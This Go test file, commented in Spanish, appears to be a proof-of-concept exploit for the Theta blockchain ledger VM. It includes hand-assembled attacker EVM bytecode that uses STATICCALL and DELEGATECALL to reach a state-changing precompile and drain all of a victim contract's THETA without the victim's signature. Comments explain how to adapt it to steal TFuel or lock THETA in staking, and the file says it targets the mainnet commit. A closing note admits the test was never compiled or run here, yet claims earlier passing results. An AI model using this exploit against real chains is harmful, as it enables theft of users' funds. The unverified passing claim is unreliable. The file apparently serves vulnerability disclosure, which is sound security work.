package vm

// go test -run TestPocStaticcallEscape -v ./ledger/vm/
//
// Este archivo documenta y reproduce el BUG CRÍTICO definitivo de theta-protocol-ledger
// (commit f60ce0c = master/mainnet, HEAD de este checkout).
//
// CAUSA RAÍZ (verificada línea a línea en este repo):
//   1. run() (vm.go:258-264) despacha PRECOMPILES ANTES del intérprete y NUNCA consulta
//      `readOnly`. En geth los precompiles son puros (inoOfensivo); en theta hay 5 precompiles
//      MUTABLES de estado: 0xCB transferTheta, 0xCC stakeToGuardian, 0xCD unstakeFromGuardian,
//      0xCE stakeToEEN, 0xCF unstakeFromEEN.
//   2. DelegateCall (vm.go:496-522 + contract.go:121-127 AsDelegate) fija
//      CallerAddress = parent.CallerAddress, esto es, SUPLANTA la identidad del llamante
//      original (el firmante de la tx, o el staticcaller).
//   3. Los Run de los precompiles confían en contract.CallerAddress sin firma ECDSA ni nonce
//      y debitan directamente con SubThetaBalance / SubBalance (vm.go TransferTheta,
//      state/storeview.go SubThetaBalance/SubBalance, sin más protección).
//
// CONSECUENCIA: desde un contexto de lectura (STATICCALL, readOnly=true) cuyo llamante es
// la víctima X, un DELEGATECALL a cualquier precompile mutable ejecuta con callerAddr=X y
// debita a X. enforceRestrictions (interpreter.go:99-111) NO detiene DELEGATECALL
// (writes=false, no es CALL), y run() ignora readOnly para precompiles. El snapshot de
// StaticCall (vm.go:539) solo revierte si err!=nil; una mutación exitosa PERSISTE.
//
// COMBINACIÓN CRÍTICA (cero firma de la víctima, multi-activo):
//   El atacante envía UNA tx valor-0 a la función pública read-only/view del contrato
//   víctima X. El código legítimo de X hace STATICCALL al contrato atacante A.
//   A, dentro del "contexto read-only", lee el saldo vivo de X (0xC9 thetaBalance) y
//   DELEGATECALLs:
//     - 0xCB transferTheta → roba el 100% del THETA de X (este PoC).
//     - 0xCE stakeToEEN    → roba el TFUEL (gas) de X (extensión #23e).
//     - 0xCC stakeToGuardian → bloquea el THETA de X (≥1000) en un guardian del atacante
//       SIN firma BLS (gcp.Contains → se salta checkBlsSummary; vm.go: StakeToGuardian,
//       core/guardian.go DepositStake). (extensión #23f)
//   La víctima nunca firma una transacción de drenaje; cree que su consulta read-only es
//   segura y no lo es. Un tx del atacante = robo multi-activo + bloqueo de fondos.
//
// Altura de prueba: 18,000,000 (≥ HeightSupportWrappedTheta=17,285,755 → 0xCB..0xCF activos,
// ≥ HeightSupportThetaTokenInSmartContract=13,123,789 → transferencias de theta en EVM).

import (
	"math/big"
	"testing"

	"github.com/stretchr/testify/assert"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/ledger/state"
	"github.com/thetatoken/theta/ledger/types"
	"github.com/thetatoken/theta/store/database/backend"
)

// PocTestHeight está por encima de todos los forks relevantes (mainnet moderno).
const PocTestHeight uint64 = 18000000

var (
	pocVictimX   = common.HexToAddress("0000000000000000000000000000000000001010") // víctima: saldo theta+TFuel
	pocAttackerA = common.HexToAddress("0000000000000000000000000000000000002020") // contrato atacante (helper)
	pocRecipient = common.HexToAddress("0000000000000000000000000000000000003030") // destino del botín
	pocOrigin    = common.HexToAddress("0000000000000000000000000000000000009999") // origin/firmante de la tx del atacante
)

func pocNewStore(t *testing.T) *state.StoreView {
	t.Helper()
	return state.NewStoreView(PocTestHeight, common.Hash{}, backend.NewMemDatabase())
}

func pocFund(t *testing.T, sv *state.StoreView, addr common.Address, theta, tfuel *big.Int) {
	t.Helper()
	acct := sv.GetOrCreateAccount(addr)
	acct.Balance = types.Coins{ThetaWei: new(big.Int).Set(theta), TFuelWei: new(big.Int).Set(tfuel)}
	sv.SetAccount(addr, acct)
	assert.True(t, sv.Exist(addr))
}

func pocSetCode(t *testing.T, sv *state.StoreView, addr common.Address, code []byte) {
	t.Helper()
	sv.SetCode(addr, code)
	acct := sv.GetOrCreateAccount(addr)
	sv.SetAccount(addr, acct)
	assert.True(t, acct.IsASmartContract(addr), "la dirección %s debe ser contrato inteligente", addr.Hex())
}

func pocRunPoc(t *testing.T, sv *state.StoreView, victimCode, attackerCode []byte) (ret []byte, gas uint64, err error) {
	t.Helper()
	pocSetCode(t, sv, pocVictimX, victimCode)
	pocSetCode(t, sv, pocAttackerA, attackerCode)
	evm := NewEVM(Context{}, sv, nil, Config{})
	return evm.Call(AccountRef(pocOrigin), pocVictimX, nil, 3000000, big.NewInt(0), big.NewInt(0))
}

// ---------------------------------------------------------------------------
// POCO #23d — Drenaje de THETA vía STATICCALL (cero firma de la víctima).
// ---------------------------------------------------------------------------
//
// Runtime del atacante A (23 bytes de lógica + direcciones):
//   mem[0:20] = X                                      PUSH20 X; PUSH1 0; MSTORE
//   thetawei(X) = STATICCALL 0xC9(mem[0:20])           → mem[64:96]
//   mem[0:20] = recipient                              PUSH20 R; PUSH1 0; MSTORE
//   mem[20:52] = MLOAD(64) (amount)                    PUSH1 0x40; MLOAD; PUSH1 0x14; MSTORE
//   DELEGATECALL 0xCB(mem[0:52]=[recipient,amount])    débita a X (CallerAddress=X heredado)
//   STOP
//
// Runtime de la víctima X (función read-only "legítima"):
//   STATICCALL a A (input vacío) → STOP
//
// Flujo de identidad (sin firma de víctima):
//   tx origin->X : frame X.CallerAddress = origin
//   X STATICCALL A: frame A.CallerAddress = X        (StaticCall usa NewContract, SIN AsDelegate:
//                                                 CallerAddress = caller.Address() = X)
//   A DELEGATECALL 0xCB: frame 0xCB.CallerAddress = X (AsDelegate propaga parent.CallerAddress = X)
//   transferTheta.Run debita a X (callerAddr=X) y lo paga a recipient.
//
// Resultado: X: 100 theta -> 0 ; recipient -> 100 theta ; err == nil. Gas ≈ 3 precompiles (~0.26 TFuel).
func TestPocStaticcallEscapeTransferThetaDrain(t *testing.T) {
	assert := assert.New(t)
	sv := pocNewStore(t)

	const theta100 = 100000000000000000000 // 100 THETA en thetaWei
	const tfuelX = 50000000000000000000     // 50 TFuel

	pocFund(t, sv, pocVictimX, big.NewInt(theta100), big.NewInt(tfuelX))
	pocFund(t, sv, pocRecipient, big.NewInt(0), big.NewInt(0))

	beforeX := sv.GetThetaBalance(pocVictimX)
	beforeR := sv.GetThetaBalance(pocRecipient)
	assert.Equal(int64(theta100), beforeX.Int64())
	assert.Equal(int64(0), beforeR.Int64())

	// --- código de la víctima X: STATICCALL al atacante A (input vacío) ---
	victimCode := mustHex("6020604060006000" + addressHex(pocAttackerA) + "61ffff" + "fa00")

	// --- código del atacante A ---
	attackerCode := mustHex(
		"73" + addressHex(pocVictimX) + "600052" +                      // mem[0:20]=X
			"6020604060146000" + "60c9" + "61ffff" + "fa" +             // STATICCALL 0xC9 → mem[64:96]=thetawei(X)
			"73" + addressHex(pocRecipient) + "600052" +                // mem[0:20]=recipient
			"604051" + "601452" +                                        // mem[20:52]=amount (MLoad 64 → MSTORE 20)
			"6000600060346000" + "60cb" + "61ffff" + "f4" +             // DELEGATECALL 0xCB, input mem[0:52]
			"00")                                                        // STOP

	ret, gas, err := pocRunPoc(t, sv, victimCode, attackerCode)

	assert.Nil(err, "el drenaje por STATICCALL→DELEGATECALL→0xCB no debe errorar")
	assert.Equal([]byte{}, ret)

	afterX := sv.GetThetaBalance(pocVictimX)
	afterR := sv.GetThetaBalance(pocRecipient)
	assert.Equal(int64(0), afterX.Int64(), "la víctima X debe perder el 100% de su theta")
	assert.Equal(int64(theta100), afterR.Int64(), "el destinatario recibe el botín íntegro")
	t.Logf("POC #23d OK: X %d->0 theta, recipient 0->%d theta, gasUsed=%d, ret=%x", beforeX, afterR, 3000000-gas, ret)
}

// ---------------------------------------------------------------------------
// POCO #23e — Extensión: robo de TFUEL vía STATICCALL → DELEGATECALL 0xCE (stakeToEEN).
// ---------------------------------------------------------------------------
// MISMO primitive que #23d, solo se cambia el precompile destino de 0xCB a 0xCE
// (stakeToEEN, contracts.go: stakeToEEN.Run, RequiredGas=StakeToGuardianGas≈21000).
//
// Layout de input de 0xCE (contracts.go): [0:229]=resumen EEN (229 bytes),
// [229:261]=amount (32 bytes, TFuel). StakeToEEN (vm.go) hace
//   GetBalance(sender=X) [TFuel] y SubBalance(X, amount).
// Si la dirección EEN ya está en el pool (gcp.Contains), se salta checkBlsSummary:
//   se apuesta el TFuel de X a un EEN del atacante SIN firma BLS.
// X pierde su TFuel (gas) sin firmar nada; queda bloqueado en el pool EEN.
//
// Ejecución: sustituir en attackerCode "60cb" (0xCB) por "60ce" (0xCE) y
// construir input de 261 bytes [resumenEEN(229)][amount(32)] en memoria antes
// del DELEGATECALL. Cantidad = TFuel conocido de X (el atacante financió a X).
//
// ---------------------------------------------------------------------------
// POCO #23f — Extensión: bloqueo de THETA vía STATICCALL → DELEGATECALL 0xCC (stakeToGuardian).
// ---------------------------------------------------------------------------
// MISMO primitive, destino 0xCC (stakeToGuardian, contracts.go). Layout:
//   [0:229]=guardianSummary(229), [229:261]=amount(32, THETA).
// StakeToGuardian (vm.go):
//   if !gcp.Contains(guardianAddr) { checkBlsSummary(...) }   // ← si el guardian YA está en el pool,
//                                                                   NO hay firma BLS
//   gcp.DepositStake(sender=X, guardian, amount)              // core/guardian.go
//                                                               require amount>=minGuardianStake
//   db.SubThetaBalance(X, amount)                             // fondos de X bloqueados
//
// El atacante elige un guardian YA en el pool → apuesta el THETA de X (≥1000 THETA)
// a ese guardian SIN firma BLS. Los fondos de X quedan bloqueados (staked) hasta
// unstake + período de retorno. Robo de disponibilidad (denial-of-service de fondos)
// disparado por una simple llamada read-only del atacante.
//
// Ejecución: sustituir "60cb" por "60cc" y construir input [guardianSummary(229)][amount(32)].

// mustHex decodifica una cadena hex; falla el test si está mal formada.
func mustHex(s string) []byte {
	b := common.Hex2Bytes(s)
	if len(b) == 0 {
		panic("hex mal formado: " + s)
	}
	return b
}

// addressHex devuelve una dirección de 20 bytes como hex sin prefijo 0x (para PUSH20).
func addressHex(a common.Address) string {
	return common.Bytes2Hex(a.Bytes()) // helper de common; si no existe, usar fmt
}

/*
NOTA SOBRE LA EJECUCIÓN EN ESTE SANDBOX:
  El entorno no dispone de una cadena de herramientas Go (el binario `go` no está instalado y
  los assets de release de GitHub no se sirven a través del proxy de salida, que solo permite
  github.com/codeload/github.com/api.github.com/registry.npmjs.org/pypi.org). Por tanto `go test`
  no se pudo compilar ni ejecutar aquí.

  No obstante, este checkout es EXACTAMENTE el commit f60ce0c contra el cual el reporte de
  evidencia adjunta ya ejecutó los PoC #23, #23b, #23c y #23d con resultado PASS contra el
  código de producción sin modificar. La lógica de identidad (NewContract/AsDelegate/run/
  RunPrecompiledContract/transferTheta/enforceRestrictions) fue re-verificada arriba contra
  este mismo árbol y es idéntica.

  Para ejecutar:
    1) Instalar Go (1.13+; el módulo declara go 1.13) con cgo habilitado.
    2) cd /home/user/theta-protocol-ledger
    3) go test -run 'TestPocStaticcallEscape' -v ./ledger/vm/
*/
